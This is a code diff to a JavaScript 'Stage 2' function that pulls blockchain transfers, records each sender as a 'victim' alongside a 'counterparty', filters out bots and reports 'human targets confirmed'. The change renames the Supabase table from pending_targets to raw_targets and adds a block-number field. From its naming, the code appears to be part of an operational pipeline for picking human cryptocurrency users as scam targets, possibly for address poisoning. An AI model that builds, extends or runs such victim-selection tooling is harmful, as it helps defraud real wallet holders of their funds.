@@ -604,6 +604,7 @@ async function fetchPendingTargets() {
               chain: chainName,
               counterparty: row.receiver,
               victim: sender,
+              last_transfer_block: row.block_number,
               processed: false,
             };
           } catch (error) {
@@ -612,6 +613,7 @@ async function fetchPendingTargets() {
               chain: chainName,
               counterparty: row.receiver,
               victim: sender,
+              last_transfer_block: row.block_number,
               processed: false,
             };
           }
@@ -627,7 +629,7 @@ async function fetchPendingTargets() {
       if (insertData.length > 0) {
         const insertedCount = await withRetry(async () => {
           const { data, error } = await supabase
-            .from('pending_targets')
+            .from('raw_targets')
             .upsert(insertData, {
               onConflict: 'chain,counterparty,victim',
               ignoreDuplicates: true,
@@ -689,17 +691,17 @@ async function fetchPendingTargets() {
 
     // ─── Summary ───
     const { count: totalCount, error: countError } = await supabase
-      .from('pending_targets')
+      .from('raw_targets')
       .select('*', { count: 'exact', head: true })
       .eq('chain', chainName);
 
     const totalInDb = countError ? 'Unknown' : totalCount;
 
-    logger.info(`[Stage 2] Run complete. Added: ${totalInserted} | Filtered: ${totalFiltered} bots | Deleted: ${totalDeleted} records | Total pending: ${totalInDb}`);
+    logger.info(`[Stage 2] Run complete. Added: ${totalInserted} | Filtered: ${totalFiltered} bots | Deleted: ${totalDeleted} records | Total raw: ${totalInDb}`);
 
     if (totalInserted > 0 || totalFiltered > 0 || totalDeleted > 0) {
       await safeSendAlert(
-        `📊 [${chainName.toUpperCase()}] Stage 2: +${totalInserted} human targets confirmed, ${totalFiltered} bots filtered, ${totalDeleted} raw transfers cleaned. Total pending: ${totalInDb}`
+        `📊 [${chainName.toUpperCase()}] Stage 2: +${totalInserted} human targets confirmed, ${totalFiltered} bots filtered, ${totalDeleted} raw transfers cleaned. Total raw: ${totalInDb}`
       );
     }
 
